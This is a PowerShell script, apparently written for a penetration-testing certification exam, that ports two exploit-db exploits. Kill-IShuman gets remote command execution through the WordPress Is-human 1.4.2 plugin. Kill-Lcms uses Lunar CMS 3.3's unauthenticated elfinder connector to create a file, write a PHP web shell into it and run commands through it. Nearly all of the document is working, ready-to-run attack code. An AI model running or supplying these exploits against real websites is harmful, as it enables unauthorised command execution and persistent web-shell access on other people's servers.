function Kill-IShuman
{ 
<#

.SYNOPSIS
A powershell script that Port two exploits from exploit-db to PowerShell.
.DESCRIPTION
This function exploit "WordPress Plugin Is-human 1.4.2 - Remote Command Execution".
 
.PARAMTER Command
Command to be executed on target website.


.PARAMTER Target
Url of the vulnerable website.

.EXAMPLE
PS C:\> . .\Exploits.ps1
PS C:\> Kill-IShuman -Target http://192.168.1.114:81/wp/ -Command dir

.LINK
https://www.exploit-db.com/exploits/17299/

This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3250
#>
[CmdletBinding()]
	Param (

		[Parameter(Mandatory=$true)]
		[String]
		$Target,

        [Parameter(Mandatory=$true)]
		[String]
		$Command
	)

$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$Command"))
$createre = "$Target/wp-content/plugins/is-human/engine.php?action=log-reset&type=ih_options();system(base64_decode($b64));error"
$WebResponse = Invoke-WebRequest $createre 
$WebResponse.Content.replace("Array", "")
}
function Kill-Lcms
{
<#

.SYNOPSIS
A powershell script that Port two exploits from exploit-db to PowerShell.
.DESCRIPTION
This function exploit "Lunar CMS 3.3 Unauthenticated Remote Command Execution".
 
.PARAMTER cmd
command to be executed on target website.


.PARAMTER Target
Url of the vulnerable website.

.PARAMTER File
Filename of the phpfile that needs to be created

.EXAMPLE
PS C:\> . .\Exploits.ps1
PS C:\> Kill-Lcms -cmd dir -Target "http://127.0.0.1:81/k" -File killitagain.php

.LINK
https://www.exploit-db.com/exploits/33867

This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3250
#>
[CmdletBinding()]
	Param (
	    
		[Parameter(Mandatory=$false)]
		[String]
		$cmd = "whoami",

		[Parameter(Mandatory=$true)]
		[String]
		$Target,
        
        [Parameter(Mandatory=$true)]
		[String]
		$File
	)
$createreq = "$Target/admin/includes/elfinder/php/connector.php?cmd=mkfile&name=$File&target=l1_XA"
$req = Invoke-RestMethod -Uri $createreq
echo "[+] File created successfully "
$b64f = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$File"))
#echo "Base64 of filename - "$b64f

$newreq = "$Target/admin/includes/elfinder/php/connector.php?cmd=put&target=l1_$b64f&content=<?php passthru(`$_GET['c']); ?>"
$req2 = Invoke-RestMethod -Uri $newreq
echo "[+] Injecting PHP Oneliner into the newfile.. "
$lastreq = "$Target/files/$File`?c=$cmd"
$req3 = Invoke-RestMethod -Uri $lastreq
echo "[+] Executing Command .."
echo "[+] Output - "$req3
}
